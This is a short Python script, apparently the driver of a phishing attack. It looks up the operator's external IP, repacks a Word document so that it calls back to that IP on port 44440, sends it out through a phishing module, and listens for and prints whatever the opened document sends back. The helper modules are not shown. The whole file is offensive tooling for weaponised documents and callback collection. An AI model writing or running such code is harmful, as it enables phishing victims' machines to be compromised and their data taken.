#!/usr/bin/env python3

import listener
import repack_word_doc
import phish

def full_phish(cmd):
    port = 44440
    my_ip = listener.get_external_ip()
    repack_word_doc.repack(ip=my_ip, port=port)
    phish.phish()

    contents = listener.listen_once(port)
    print("Got:")
    print(contents.decode())

if __name__ == "__main__":
    cmd = "hello"
    full_phish(cmd)
